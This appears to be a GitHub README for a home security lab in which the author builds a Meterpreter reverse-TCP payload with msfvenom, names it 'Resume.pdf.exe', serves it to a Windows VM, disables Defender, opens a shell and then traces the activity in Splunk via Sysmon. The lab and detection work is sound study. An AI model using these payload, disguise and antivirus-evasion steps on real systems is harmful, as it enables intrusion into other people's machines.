# Basic Home Labs

## Objective

The Basic Home Labs Project is an initiative focused on hands-on experimentation using simple, cost-effective home laboratory environments. The project aims to design and deploy controlled test systems to generate and collect system, network, and security telemetry, enabling the analysis and detection of malware behavior on a target machine.
 
### Skills Learned

- Learning how to set up and configuration on home lab environments
- Detecting malicious activity using telemetry and security indicators
- Using SIEM and log analysis tools to correlate events across data sources


### Tools Used

- Nmap (Network Mapper), find open ports/services, identify operating systems, and detect vulnerabilities by sending specially crafted packets to targets and analyzing responses.
- Create Payload Using Msfvenom
- Security Information and Event Management (SIEM) system for log ingestion and analysis.

## Steps

![1](https://github.com/user-attachments/assets/158c8609-276a-404c-a393-41855c3fdaff)


- Download VirtualBox and install Windows & Kali Linux
- Install Splunk and download "Splunk Add-on for Sysmon"
- Install Sysmon on Windows VM
- Configure VMs, use Internal Network and set static IP


```console
ping <target_hostname_or_IP_address>
```
- Make sure both machine can ping each other
  
```console
nmap -A <target_hostname_or_IP_address> -Pn
```
- In Kali, open Terminal, type in above command to scan target machine port, take note on which port is open

```console
msfvenom -l payloads
```
- Lists payloads avalible for use

```console
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<Attacker_IP_address> lport=4444 -f exe -o Resume.pdf.exe
```
- In this project, we will use reverse shell options
- This command will generate malware using meterpreter's reverse TCP payload which is instructed to connect back to L host and L port, the file format is exe

> [!NOTE] 
> The purpose of a reverse shell is simple: to get a shell. This is most likely everybody’s first choice. There are many different reverse shells available, and the most commonly known and stable has been the windows/meterpreter/reverse_tcp payload.

```console
msfconsole
```
- Open up a Handler that will listen on the port that we have configured in the malware by open Metasploit

```console
use exploit/multi/handler
```
- Use the multi-handler by type the above command, then we should be in the exploit itself

```console
options
```
- Type options to see what we can configure

![2](https://github.com/user-attachments/assets/98aba99f-0129-439c-af8f-1d2bfa3fabac)

- Then, change the payload in the yellow frame to be the same one that we use by typing below command

```console
set payload windows/x64/meterpreter/reverse_tcp
```
- Type options again, now we can see the payload have changed
- Set L host and type IP of the attacker machine, in this case is Kali IP
  
```console
set lhost <Attacker_IP_address>
```
![3](https://github.com/user-attachments/assets/d8a718d2-9627-4ca3-9bcd-1f5ab343ea6d)

```console
exploit
```
- Start this Handler
- Now we are listening in and waiting for pur test machine to execute the malware


- We want to set up HTTP server on Kali so our test machine can download the malware
- We will use Python in this case
- Open up a new tab Terminal
- Make sure we are in the same directory as the malware
  
```console
python3 -m http.server 9999
```
- Make sure the port that not in use
- This should allow test machine to access Kali machine and start downloading the malware from there

> [!NOTE]
> Now we have everything ready to go on our Kali Machine. We want to shift over to Windows VM. 
> Disable Windows Defender and access our web browser to download and execute the malware

- Head to Security Center and disable Defender under Virus & threat protection, click on Manage setting and turn off real-time protection
- Open web browser type in "<Attacker_IP_address>:9999"
- We will see "Resume.pdf.exe"
- Click and download it
- Open Command Promt as administrator and type in..

```console
netstat -anob
```
- We want to see if an established connection to Kali machine is there, scroll up and you can see it

![4](https://github.com/user-attachments/assets/08958183-54d5-4b09-b8ae-57f1ec3d53ac)



> [!IMPORTANT]
> Since I use Windows11, I got block by Microsoft Defender Antivirus many times until I found out I have to not only turn off real-time protection but also "exclusions" Resume.pdf.exe file before I can execute it

- Head back to Kali machine, we should have a connection on our Handler
```console
help
```
- Type help to see what kind of commands exist
```console
shell
```
- To establish a shell in our test machine
```console
net user
```
```console
net localgroup
```
```console
ipconfig
```
- That's enough commands. Let's head back to Windows machine and see what kind of telemetry we had generated
- Make sure Splunk is configured to ingest sysmon logs by going to "C:\Program Files\Splunk\etc\system\local" 
- Add "inputs.conf" file by download <a href="https://tinyurl.com/MyDFIR-Splunk-Inputs">HERE</a> and put it in "Splunk\etc\system\local"
- Restart Splunk services by search "services" > Splunkd Service > right click > restart
- Open Splunk on the browser and select settings > Indexes > New Index > put "endpoint" > save ,for now data is being ingested into our environment
> [!NOTE]
> If it doesn't show data as we think, go back and redo in Kali (nmap, executed malware until run 3 commands in shell)

- Go to "Search and Reporting", type in
>  index="endpoint" Resume.pdf(1).exe

>[!NOTE]
>In my case is Resume.pdf(1).exe because I did download and use the second one instead of Resume.pdf.exe

- Try to see the EventCode=1 from the result we can see the ParentImage has Resume.pdf(1).exe has spawned cmd.exe 
- Use "process_guid" value to search
> index="endpoint" {process_guid_value} | table _time,ParentImage,Image,CommandLine

- We will see the result what we did in Kali machine
  
  ![5](https://github.com/user-attachments/assets/238d7d0a-7a22-40be-853e-d799e75c9b20)

Credit : Thanks <a href="https://www.youtube.com/@MyDFIR">MyDFIR</a> <a href="https://www.youtube.com/watch?v=-8X7Ay4YCoA&list=PLG6KGSNK4PuBWmX9NykU0wnWamjxdKhDJ&index=4">Learning video</a>

